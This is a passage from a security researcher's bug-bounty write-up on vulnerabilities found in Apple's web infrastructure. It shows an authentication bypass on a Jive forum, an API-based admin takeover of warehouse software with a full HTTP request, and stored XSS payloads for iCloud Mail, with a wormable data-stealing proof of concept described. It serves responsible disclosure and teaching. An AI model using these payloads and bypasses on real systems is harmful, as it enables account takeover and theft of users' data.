<div><p>
                                                                            During our engagement, we found a variety of vulnerabilities in core portions of their infrastructure that would&#39;ve allowed an attacker to fully compromise both customer and employee applications, launch a worm capable of automatically taking over a victim&#39;s iCloud account, retrieve source code for internal Apple projects, fully compromise an industrial control warehouse software used by Apple, and take over the sessions of Apple employees with the capability of accessing management tools and sensitive resources.
                                                                        </p><p>
                                                                            There were a total of 55 vulnerabilities discovered with 11 critical severity, 29 high severity, 13 medium severity, and 2 low severity reports. These severities were assessed by us for summarization purposes and are dependent on a mix of CVSS and our understanding of the business related impact.
                                                                        </p><p>
                                                                            As of October 6th, 2020, the vast majority of these findings have been fixed and credited. They were typically remediated within 1-2 business days (with some being fixed in as little as 4-6 hours).
                                                                        </p><h2>
                                                                            Introduction
                                                                        </h2><p>
                                                                            While scrolling through Twitter sometime around July I noticed a blog post being shared where a researcher was awarded $100,000 from Apple for discovering an authentication bypass that allowed them to arbitrarily access any Apple customer account. This was surprising to me as I previously understood that Apple&#39;s bug bounty program only awarded security vulnerabilities affecting their physical products and did not payout for issues affecting their web assets.
                                                                        </p><div class="embed-placeholder" data-type="twitter" data-id="1266755207402143746"><iframe scrolling="no" frameborder="0" allowfullscreen="true" title="Twitter Tweet" src="https://platform.twitter.com/embed/index.html?dnt=true&amp;embedId=twitter-widget-0&amp;frame=false&amp;hideCard=false&amp;hideThread=false&amp;id=1266755207402143746&amp;lang=en&amp;origin=https%3A%2F%2Fsamcurry.net%2Fhacking-apple%2F&amp;theme=light&amp;widgetsVersion=ed20a2b%3A1601588405575&amp;width=550px" name="twitter-widget-0"></iframe></div><p>
                                                                            After finishing the article, I did a quick Google search and found their program page where it detailed Apple was willing to pay for vulnerabilities &#34;with significant impact to users&#34; regardless of whether or not the asset was explicitly listed in scope.
                                                                        </p><p>
                                                                            This caught my attention as an interesting opportunity to investigate a new program which appeared to have a wide scope and fun functionality. At the time I had never worked on the Apple bug bounty program so I didn&#39;t really have any idea what to expect but decided why not try my luck and see what I could find.
                                                                        </p><p>
                                                                            In order to make the project more fun I sent a few messages to hackers I&#39;d worked with in the past and asked if they&#39;d like to work together on the program. Even though there was no guarantee regarding payouts nor an understanding of how the program worked, everyone said yes, and we began hacking on Apple.
                                                                        </p><h2>
                                                                            Reconnaissance
                                                                        </h2><p>
                                                                            The first step in hacking Apple was figuring out what to actually target. Both Ben and Tanner were the experts here, so they began figuring out what all Apple owned that was accessible to us. All of the results from their scanning were indexed in a dashboard that included the HTTP status code, headers, response body, and screenshot of the accessible web servers under the various domains owned by Apple that we’d refer to over the engagement.
                                                                        </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/recon_img-1024x524.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/recon_img-1024x524.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/recon_img-300x153.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/recon_img-768x393.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/recon_img-1536x785.png 1536w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/recon_img.png 1600w" sizes="(max-width: 936px) 100vw, 936px"/></figure><p>
                                                                            To be brief: Apple&#39;s infrastructure is massive.
                                                                        </p><p>
                                                                            They own the entire 17.0.0.0/8 IP range, which includes 25,000 web servers with 10,000 of them under apple.com, another 7,000 unique domains, and to top it all off, their own TLD (dot apple). Our time was primarily spent on the 17.0.0.0/8 IP range, .apple.com, and .icloud.com since that was where the interesting functionality appeared to be.
                                                                        </p><p>
                                                                            After making a listing of all of the web servers, we began running directory brute forcing on the more interesting ones.
                                                                        </p><p>
                                                                            Some of the immediate findings from the automated scanning were...
                                                                        </p><ul><li>VPN servers affected by Cisco CVE-2020-3452 Local File Read 1day (x22)</li><li>Leaked Spotify access token within an error message on a broken page</li></ul><p>
                                                                            The information obtained by these processes were useful in understanding how authorization/authentication worked across Apple, what customer/employee applications existed, what integration/development tools were used, and various observable behaviors like web servers consuming certain cookies or redirecting to certain applications.
                                                                        </p><p>
                                                                            After all of the scans were completed and we felt we had a general understanding of the Apple infrastructure, we began targeting individual web servers that felt instinctively more likely to be vulnerable than others.
                                                                        </p><p>
                                                                            This began a series of findings that continued throughout our engagement and progressively increased our understanding of Apple’s program.
                                                                        </p><h2>
                                                                            Vulnerabilities Discovered
                                                                        </h2><h2>
                                                                            Vulnerability Write-Ups
                                                                        </h2><p>
                                                                            We can’t write about all the vulnerabilities we discovered, but here is a sample of some of the more interesting vulnerabilities.
                                                                        </p><h2>
                                                                                Full Compromise of Apple Distinguished Educators Program via Authentication and Authorization Bypass
                                                                            </h2><p>
                                                                                One of the first services we spent time hacking was the “Apple Distinguished Educators” site. This was an invitation-only Jive forum where users could authenticate using their Apple account. Something interesting about this forum was that some of the core Jive functionality to register to the app was ported through a custom middleware page built by Apple in order to connect their authentication system (IDMSA) to the underlying Jive forum which normally used username/password authentication.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/untitled.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/untitled.png 441w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/untitled-300x114.png 300w" sizes="(max-width: 441px) 100vw, 441px"/></figure><p>
                                                                                This was built to allow users to easily use their already existing Apple account to authenticate to the forum and not have to deal with creating an additional user account. You would simply use the “Sign In With Apple” and be logged into the forum.
                                                                            </p><p>
                                                                                The landing page for users who were not allowed to access the forum was an application portal where you provided information about yourself that was assessed by the forum moderators for approval.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda.png 1002w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda-300x86.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda-768x221.png 768w" sizes="(max-width: 1002px) 100vw, 1002px"/></figure><p>
                                                                                When you submitted an application to use the forum, you supplied nearly all of the values of your account as if you were registering to the Jive forum normally. This would allow the Jive forum to know who you were based on your IDMSA cookie since it tied your email address belonging to your Apple account to the forum.
                                                                            </p><p>
                                                                                One of the values that was hidden on the page within the application to register to use the forum was a “password” field with the value “<em>###INvALID#%!3</em>”. When you submitted your application that included your username, first and last name, email address, and employer, you were also submitting a “password” value which was then secretly tied to your account sourced from a hidden input field on the page.
                                                                            </p><pre><code>&lt;div class=&#34;j-form-row&#34;&gt;
&lt;input id=&#34;password&#34; type=&#34;hidden&#34; value=&#34;###INvALID#%!3&#34;&gt;
&lt;div id=&#34;jive-pw-strength&#34;&gt;
...</code></pre><p>
                                                                                After observing the hidden default password field, we immediately had the idea to find a way to manually authenticate to the application and access an approved account for the forum instead of attempting to login using the “Sign In With Apple” system. We investigated this because the password was the same for each one of us on our separate registrations.
                                                                            </p><p>
                                                                                If anyone had applied using this system and there existed functionality where you could manually authenticate, you could simply login to their account using the default password and completely bypass the &#34;Sign In With Apple&#34; login.
                                                                            </p><p>
                                                                                From a quick glance, it did not appear that you could manually authenticate, but after a few Google searches we identified a “cs_login” endpoint which was meant for logging in with a username and password to Jive applications. When we manually formed the test HTTP request to authenticate to the Apple Distinguished Developers application, we found that it attempted to authenticate us by displaying an incorrect password error. When we used our own accounts that we had previously applied with, the application errored out and did not allow us to authenticate as we were not yet approved. We would have to find the username of an already approved member if we wanted to authenticate.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_authentication.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_authentication.png 501w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_authentication-300x132.png 300w" sizes="(max-width: 501px) 100vw, 501px"/></figure><p>
                                                                                At this point, we loaded the HTTP request into Burp Suite’s intruder and attempted to brute force usernames between 1 and 3 characters via the login and default password.
                                                                            </p><p>
                                                                                After about two minutes we received a 302 response indicating a successful login to a user with a 3 character username using the default password we found earlier. We were in! From this point, our next goal was to authenticate as someone with elevated permissions. We took a few screenshots of our access and clicked the “Users” list to view which users were administrators. We logged into the first account we saw on the list in an attempt to prove we could achieve remote code execution via the administrative functionality, however, there were still a few roadblocks ahead.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-1024x529.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-1024x529.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-300x155.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-768x397.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x.png 1039w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                When attempting to browse to “/admin/” (the Jive administrator console) as the admin account, the application redirected to login as if we were not yet authenticated. This was strange, as it was custom behavior for the Jive application and none of us had observed this before. Our guess was that Apple had restricted the administration console based on IP address to make sure that there was never a full compromise of the application.
                                                                            </p><p>
                                                                                One of the first things we tried was using the X-Forwarded-For header to bypass the hypothetical restriction, but sadly that failed. The next thing we tried was to load a different form of “/admin/” in-case the application had path specific blacklists for accessing the administrator console.
                                                                            </p><p>
                                                                                After just a few more HTTP requests, we figured out that “GET /admin;/” would allow an attacker to access the administration console. We automated this bypass by setting up a Burp Suite rule which automatically changed “GET/POST /admin/” to “GET/POST /admin;/” in our HTTP requests.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/match_and_replace.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/match_and_replace.png 675w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/match_and_replace-300x62.png 300w" sizes="(max-width: 675px) 100vw, 675px"/></figure><p>
                                                                                When we finally navigated and loaded the administration console, it was immediately clear that something wasn’t right. We did not have access to the normal functionality that would demonstrate remote code execution (there was no templating, plugin upload, nor the standard administrative debugging functionality).
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-1024x388.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-1024x388.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-300x114.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-768x291.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive.png 1361w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                At this point, we stopped to think about where we were and realized that the account we authenticated to may not be the “core” administrator of the application. We went ahead and authenticated to 2-3 more accounts before finally authenticating as the core administrator and seeing functionality that would allow for remote code execution.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-1024x477.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-1024x477.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-300x140.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-768x358.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home.png 1102w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                An attacker could (1) bypass the authentication by manually authenticating using a hidden default login functionality, then (2) access the administration console via sending a modified HTTP path in the request, and finally (3) completely compromise the application by using the one of many “baked in RCE” functionalities like plugin upload, templating, or file management.
                                                                            </p><p>
                                                                                Overall, this would&#39;ve allowed an attacker to...
                                                                            </p><ul><li>Execute arbitrary commands on the ade.apple.com webserver</li><li>Access the internal LDAP service for managing user accounts</li><li>Access the majority of Apple&#39;s internal network</li></ul><p>
                                                                                At this point, we finished the report and submitted everything.
                                                                            </p><h2>
                                                                                Full Compromise of DELMIA Apriso Application via Authentication Bypass
                                                                            </h2><p>
                                                                                Something we had thought about a lot while hacking Apple was whether or not they had any accessible services relating to the manufacturing and distribution of their products. As it turns out, there was an application called &#34;DELMIA Apriso&#34; which was a third-party &#34;Global Manufacturing Suite&#34; which provided what appeared to be various warehouse solutions.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000.png 854w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000-300x121.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000-768x310.png 768w" sizes="(max-width: 854px) 100vw, 854px"/></figure><p>
                                                                                Sadly, there did not appear to be much available interaction for the technology as you could only &#34;login&#34; and &#34;reset password&#34; from the available interfaces.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-1024x364.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-1024x364.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-300x107.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-768x273.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters.png 1197w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                After attempting to find vulnerabilities on the limited number of pages, something strange happened: we were authenticated as a user called &#34;Apple No Password User&#34; based on a bar which appeared in the upper right portion of the site.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/app_no_pw.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/app_no_pw.png 536w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/app_no_pw-300x44.png 300w" sizes="(max-width: 536px) 100vw, 536px"/></figure><p>
                                                                                What had happened was that, by clicking &#34;Reset Password&#34;, we were temporarily authenticated as a user who had &#34;Permission&#34; to use the page.
                                                                            </p><p>
                                                                                The application&#39;s authentication model worked whereas users had specific permissions to use specific pages. The &#34;reset password&#34; page counted as a page itself, so in order to let us use it, the application automatically logged us into an account that was capable of using the page.
                                                                            </p><p>
                                                                                We attempted a variety of things in order to elevate our permissions but didn&#39;t seem to get anywhere for a long time. After a while, we sent an HTTP request to an OAuth endpoint in an attempt to generate an authorization bearer that we could use to explore the API. This was successful!
                                                                            </p><p>
                                                                                Our user account, even though its permissions were intended to be limited to authorization and resetting our password, could generate a bearer which had permission to access the API version of the application.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1024x179.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1024x179.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-300x53.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-768x134.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1536x269.png 1536w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1600x280.png 1600w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez.png 1891w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                We were now able to explore the API and hopefully find some permission issue which would allow us to compromise some portion of the application. Luckily, during our recon process, we found a list of API requests for the application.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref.png 1000w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref-300x192.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref-768x491.png 768w" sizes="(max-width: 1000px) 100vw, 1000px"/></figure><p>
                                                                                We sadly did not have access to the majority of the API calls, but some sections like &#34;Operations&#34; disclosed a massive number of available functionalities.
                                                                            </p><p>
                                                                                If you hit the &#34;/Apriso/HttpServices/api/platform/1/Operations&#34; endpoint, it would return a list of nearly 5,000 different API calls. None of these required authentication beyond the initial authorization bearer we initially sent. The operations disclosed here included things like...
                                                                            </p><ul><li>Creating and modifying shipments</li><li>Creating and modifying employee paydays</li><li>Creating and modifying inventory information</li><li>Validating employee badges</li><li>Hundreds of warehouse related operations</li></ul><p>
                                                                                The one that we paid most attention to was &#34;APL_CreateEmployee_SO&#34;.
                                                                            </p><p>
                                                                                You could send a GET request to the specific operations and receive the expected parameters using the following format:
                                                                            </p><pre><code>GET /Apriso/HttpServices/api/platform/1/Operations/operation HTTP/1.1
Host: colormasters.apple.com</code></pre><p>
                                                                                With the following HTTP response:
                                                                            </p><pre><code>{
  &#34;InputTypes&#34;: {
    &#34;OrderNo&#34;: &#34;Char&#34;,
    &#34;OrderType&#34;: &#34;Integer&#34;,
    &#34;OprSequenceNo&#34;: &#34;Char&#34;,
    &#34;Comments&#34;: &#34;Char&#34;,
    &#34;strStatus&#34;: &#34;Char&#34;,
    &#34;UserName&#34;: &#34;Char&#34;
  },
  &#34;OutputTypes&#34;: {},
  &#34;OperationCode&#34;: &#34;APL_Redacted&#34;,
  &#34;OperationRevision&#34;: &#34;APL.I.1.4&#34;
}</code></pre><p>
                                                                                It took a bit of time, but after a while we realized that in order to actually call the API you had to send a POST request with JSON data in the following format:
                                                                            </p><pre><code>{
  &#34;inputs&#34;: {
    &#34;param&#34;: &#34;value&#34;
  }
}</code></pre><p>
                                                                                The above format (after the fact) appears very simple and easy to understand, but at the time of hacking we had absolutely no idea how to form this call. I had even tried emailing the company who provided the software asking how you were supposed to form these API calls, but they wouldn&#39;t respond to my email because I didn&#39;t have a subscription to the service.
                                                                            </p><p>
                                                                                I&#39;d spent nearly 6 hours trying to figure out how to form the above API call, but after we figured it out, it was very much smooth sailing. The &#34;create employee&#34; function required various parameters that relied on UUIDs, but we were able to retrieve these via the other &#34;Operations&#34; and fill them in as we went along.
                                                                            </p><p>
                                                                                About two hours more, we finally formed the following API request:
                                                                            </p><pre><code>POST /Apriso/HttpServices/api/platform/1/Operations/redacted HTTP/1.1
Host: colormasters.apple.com
Authorization: Bearer redacted
Connection: close
Content-Type: application/json
Content-Length: 380
{
  &#34;inputs&#34;: {
    &#34;Name&#34;: &#34;Samuel Curry&#34;,
    &#34;EmployeeNo&#34;: &#34;redacted&#34;,
    &#34;LoginName&#34;: &#34;yourloginname123&#34;,
    &#34;Password&#34;: &#34;yourpassword123&#34;,
    &#34;LanguageID&#34;: &#34;redacted&#34;,
    &#34;AddressID&#34;: &#34;redacted&#34;,
    &#34;ContactID&#34;: &#34;redacted&#34;,
    &#34;DefaultFacility&#34;: &#34;redacted&#34;,
    &#34;Department&#34;: &#34;&#34;,
    &#34;DefaultMenuItemID&#34;: &#34;redacted&#34;,
    &#34;RoleName&#34;: &#34;redacted&#34;,
    &#34;WorkCenter&#34;: &#34;&#34;
  }
}</code></pre><p>
                                                                                After we sent this API call, we could now authenticate as a global administrator to the application. This gave us full oversight to the warehouse management software and probably RCE via some accepted functionality.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-1024x469.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-1024x469.png 1024w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-300x137.png 300w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-768x352.png 768w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz.png 1507w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure><p>
                                                                                There were hundreds of different functionalities that would&#39;ve caused massive information disclosure and been capable of disrupting what appeared to be a somewhat crucial application used for inventory and warehouse management.
                                                                            </p><h2>
                                                                                Wormable Stored Cross-Site Scripting Vulnerabilities Allow Attacker to Steal iCloud Data through a Modified Email
                                                                            </h2><p>
                                                                                One of the core parts of Apple’s infrastructure is their iCloud platform. This website works as an automatic storage mechanism for photos, videos, documents, and app related data for Apple products. Additionally, this platform provides services like Mail and Find my iPhone.
                                                                            </p><p>
                                                                                The mail service is a full email platform where users can send and receive emails similar to Gmail and Yahoo. Additionally, there is a mail app on both iOS and Mac which is installed by default on the products. The mail service is hosted on “www.icloud.com” alongside all of the other services like file and document storage.
                                                                            </p><p>
                                                                                This meant, from an attackers perspective, that any cross-site scripting vulnerability would allow an attacker to retrieve whatever information they wanted to from the iCloud service. We began to look for any cross-site scripting issues at this point.
                                                                            </p><p>
                                                                                The way the mail application works is very straightforward. When the service receives an email and a user opens it, the data is processed into a JSON blob which is sanitized and picked apart by JavaScript and then displayed to the user.
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/icloud-mail.jpg" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/icloud-mail.jpg 600w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/icloud-mail-300x210.jpg 300w" sizes="(max-width: 600px) 100vw, 600px"/></figure><p>
                                                                                This means that there is no server side processing of the emails in terms of content sanitation, and that all of the actual functionality to render and process the mail body is within the JavaScript where it’s done client side. This isn’t necessarily a bad thing, but simplifies the process of identifying XSS by understanding what specifically we’ll need to break within the source code.
                                                                            </p><h3>
                                                                                Stored XSS via Style Tag Confusion
                                                                            </h3><p>
                                                                                When testing this functionality one of the things I eventually messed with was the “&lt;style&gt;” tag. This tag is interesting as the DOM will only cancel this element with an end “&lt;/style&gt;” tag. This means that if we wrote “&lt;style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/style&gt;” and it was fully rendered in the DOM, there would be no alert prompt as the content of the tag is strictly CSS and the script tag was stuffed within the tag and not beyond the closing tag.
                                                                            </p><p>
                                                                                From a sanitization perspective, the only things Apple would need to worry about here would be an ending style tag, or if there was sensitive information on the page, CSS injection via import chaining.
                                                                            </p><p>
                                                                                I decided to focus on trying to break out of the style tag without Apple realizing it since it would be a very straightforward stored XSS if achievable.
                                                                            </p><p>
                                                                                I played around with this for a while trying various permutations and eventually observed something interesting: when you had two style tags within the email, the contents of the style tags would be concatenated together into one style tag. This meant that if we could get “&lt;/sty” into the first tag and “le&gt;” into the second tag, it would be possible to trick the application into thinking our tag was still open when it really wasn’t.
                                                                            </p><p>
                                                                                I sent the following payload to test if it would work:
                                                                            </p><pre><code>&lt;style&gt;&lt;/sty&lt;/style&gt;
&lt;style&gt;le&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/style&gt;</code></pre><p>
                                                                                The email popped up in my inbox. I clicked it. There was an alert prompt! It had worked!
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/alert-1.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/alert-1.png 646w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/alert-1-300x158.png 300w" sizes="(max-width: 646px) 100vw, 646px"/></figure><p>
                                                                                The DOM of the page included the following:
                                                                            </p><pre><code>&lt;style&gt;&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/style&gt;</code></pre><p>
                                                                                Since the mail application is hosted on “www.icloud.com” this meant that we had browser permissions to retrieve the HTTP responses for the corresponding APIs for the iCloud service (if we could sneak in the JavaScript to reach out to them).
                                                                            </p><p>
                                                                                An explanation of the above payload is as follows:
                                                                            </p><figure><img loading="lazy" src="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram_explan.png" alt="" srcset="https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram_explan.png 311w, https://secureservercdn.net/198.71.233.197/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram_explan-300x223.png 300w" sizes="(max-width: 311px) 100vw, 311px"/></figure><p>
                                                                                At this point we decided the coolest proof of concept would be something which steals all of the victim’s personal information (photos, calendar information, and documents) then forwards the same exploit to all of their contacts.
                                                                            </p><p>
                                                                                We built a neat PoC which would return the photo URLs from the iCloud API, stick them into image tags, and then append a list of contacts for the user account underneath them. This demonstrated that it was possible to retrieve the values, but in order to exfiltrate them we would have to bypass a CSP which meant no easy outbound HTTP requests to anything but “.apple.com” and a few other domains.
                                                                            </p><p>
                                                                                Luckily for us, the service is a mail client. We can simply use JavaScript to invoke an email to ourselves, attach the iCloud photo URLs and contacts, then fire away all of the victim’s signed iCloud photo and document URLs.
                                                                            </p><p>
                                                                                The following video demonstrates a proof of concept whereas a victim’s photos are stolen. In a full exploitation scenario performed by a malicious party, an attacker could silently steal all of the victim’s photos, videos, and documents, then forward the modified email to the victim’s contact list and worm the cross-site scripting payload against the iCloud mail service.
                                                                            </p><div class="embed-placeholder" data-type="youtube" data-id="jclY-s2kJ7E"><iframe title="Proof of Concept" src="https://www.youtube.com/embed/jclY-s2kJ7E?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe></div><h3>
                                                                                Stored XSS via Hyperlink Confusion
                                                                            </h3><p>
                                                                                Later on I found a second cross-site scripting vulnerability affecting mail in a similar fashion.
                                                                            </p><p>
                                                                                One thing I’ll always check with these sorts of semi-HTML applications is how they handle hyperlinks. It seems intuitive to automatically turn an unmarked URL into a hyperlink, but it can get messy if it isn’t being sanitized properly or is combined with other functionalities. This is a common place to look for XSS due to the reliance on regex, innerHTML, and all of the accepted elements you can add alongside the URL.
                                                                            </p><p>
                                                                                The second piece of interesting functionality for this XSS is the total removal of certain tags like “&lt;script&gt;” and “&lt;iframe&gt;”. This one is neat because certain things will rely on characters like space, tabs, and new lines whereas the void left by the removed tag can provide those characters without telling the JavaScript parser. These indifferences allow for attackers to confuse the application and sneak in malicious characters which can invoke XSS.
                                                                            </p><p>
                                                                                I played around with both of these functionalities for a while (automatic hyperlinking and the total removal of certain tags) until deciding to combine the two and attempt to see how they behaved together. To my surprise, the following string broke the hyperlinking functionality and confused the DOM:
                                                                            </p><pre><code>https://www.domain.com/abc#&lt;script&gt;&lt;/script&gt;https://domain.com/abc</code></pre><p>
                                                                                After sending the above by itself within an email, the content was parsed to the following:
                                                                            </p><pre><code>&lt;a href=&#34;https://www.domain.com/abc#&lt;a href=&#34; https:=&#34;&#34; www.domain.com=&#34;&#34; abc=&#34;&amp;quot;&#34; rel=&#34;noopener noreferrer&#34;&gt;https://www.domain.com/abc&lt;/a&gt;</code></pre><p>
                                                                                This was very interesting to see initially, but exploiting it would be a bit harder. It is easy to define the attributes within the tag (e.g. src, onmouseover, onclick, etc.) but providing the values would be difficult as we still had to match the URL regex so it wouldn’t escape the automatic hyperlinking functionality. The payload that eventually worked without sending single quotes, double quotes, parenthesis, spaces, or backticks was the following:
                                                                            </p><pre><code>https://www.icloud.com/mail/#&lt;script&gt;&lt;/script&gt;https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//</code></pre><p>
                                                                                The payload produced this in the DOM:
